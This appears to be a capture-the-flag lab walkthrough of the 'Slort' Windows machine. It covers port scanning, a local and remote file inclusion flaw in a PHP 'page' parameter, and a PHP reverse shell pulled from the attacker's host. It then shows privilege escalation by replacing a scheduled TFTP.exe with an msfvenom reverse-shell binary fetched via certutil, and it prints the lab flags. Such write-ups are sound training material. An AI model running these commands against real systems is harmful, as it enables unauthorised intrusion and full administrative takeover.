@@ -1,0 +1,151 @@
+																			                        Slort Walkthrough
+																																							
+Attacker's Machine: 192.168.45.170
+Victim's Machine: 192.168.168.53
+export IP=192.168.168.53
+
+nmapAutomator.sh -H $IP -t Full
+
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3306/tcp  open  mysql?
+| fingerprint-strings: 
+|   NULL: 
+|_    Host '192.168.45.170' is not allowed to connect to this MariaDB server
+4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+| http-title: Welcome to XAMPP
+|_Requested resource was http://192.168.168.53:4443/dashboard/
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
+| http-title: Welcome to XAMPP
+|_Requested resource was http://192.168.168.53:8080/dashboard/
+|_http-open-proxy: Proxy might be redirecting requests
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows;
+
+# Ports 21, 139,445 revealed nothing usefull.
+
+http://192.168.168.53:4443/dashboard/phpinfo.php
+
+C:\Users\rupert                   # Possible username
+UserDomain  	SLORT
+C:/xampp/htdocs                 # Document root
+
+# Got nothing else so far, let's go for enumeration on ports 4443 and 8080.
+   Discovered the following web page at /site
+   
+http://192.168.168.53:8080/site/index.php
+
+# Additional enumeration done on /site didn't releave anything usefull.
+   Let's grab the possible usernames from within the website from “About” Section.
+   
+Jane Simpson
+Richard Wilson
+Craig Davidson
+
+http://192.168.168.53:4443/site/index.php?page=portfolio.php
+
+Looking at the page parameter, when we try a different file, we get this error which leads us to believe the LFI vulnerability is possible.
+
+
+# Let's try to exploit this Using PHP Wrapper
+
+php://filter/convert.base64-encode/resource=C:\xampp\php\php.ini
+
+
+
+# Check for RFI
+
+python3 -m http.server 80
+
+http://192.168.168.53:4443/site/index.php?page=http://192.168.45.170
+
+
+
+# Nice, we got RFI, let's prepare a PHP rev_shell and let's try to access directly from the webapp through the vulnerable page parameter while having a listener on.
+
+rlwrap nc -lvnp 4444
+
+http://192.168.168.53:4443/site/index.php?page=http://192.168.45.170/php_reverse_shell.php
+
+
+
+# We got shell, let's grab the flag and move towards privilege escalation.
+
+cd C:\Users\rupert\Desktop
+more local.txt
+bdc693e5f2a9699715d2726e1c5b390f
+
+Privilege escalation
+
+systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)" /c:"System Boot Time" /c:"Windows Directory"
+Host Name:                    SLORT
+OS Name:                      Microsoft Windows 10 Pro
+OS Version:                   10.0.19042 N/A Build 19042
+System Boot Time:          2/17/2023, 10:24:56 AM
+System Type:                 x64-based PC
+Windows Directory:        C:\WINDOWS
+Hotfix(s):                      5 Hotfix(s) Installed.
+Network Card(s):           1 NIC(s) Installed.
+
+# Get updates
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+Caption                                                                  Description     HotFixID         InstalledOn  
+http://support.microsoft.com/?kbid=5009467             Update          KB5009467      5/4/2022     
+https://support.microsoft.com/help/4562830              Update          KB4562830      12/3/2021    
+https://support.microsoft.com/help/5007253              Update          KB5007253      12/3/2021    
+                                                                             Update          KB5006753      12/3/2021    
+                                                                             Update          KB5007273      12/3/2021
+                                                                             
+# Going through the directories, we notice a “Backup” directory present. By checking it's contents, we notice that the TFTP.exe is ran every 5 minutes.
+
+
+06/12/2020  07:45 AM            11,304 backup.txt
+06/12/2020  07:45 AM                73 info.txt
+09/20/2023  02:37 AM             7,168 TFTP.exe
+
+more info.txt
+Run every 5 minutes:
+C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
+
+# Let's see if we have rights over the executable, if so, we can replace the executable file with our own reverse shell executable and get administrative privileges.
+
+icacls TFTP.exe
+TFTP.exe BUILTIN\Users:(I)(F)
+         BUILTIN\Administrators:(I)(F)
+         NT AUTHORITY\SYSTEM:(I)(F)
+         NT AUTHORITY\Authenticated Users:(I)(M)
+         
+# Since we have full rights, let's replace the executable. First create a backup of TFTP.exe file into TFTP.exe.bak
+
+copy TFTP.exe TFTP.exe.bak
+del TFTP.exe
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=4444 -f exe > shell.exe
+
+# Download the executable in the backupfolder with the name TFTP.exe
+
+certutil.exe -urlcache -split -f http://192.168.45.170/shell.exe TFTP.exe
+
+# Have a listener open and wait for the shell.
+
+rlwrap nc -lvnp 4444
+
+whoami
+slort\administrator
+
+cd C:\Users\Administrator\Desktop
+more proof.txt
+098edbf2dfa7b792ffe5b449b202ad73
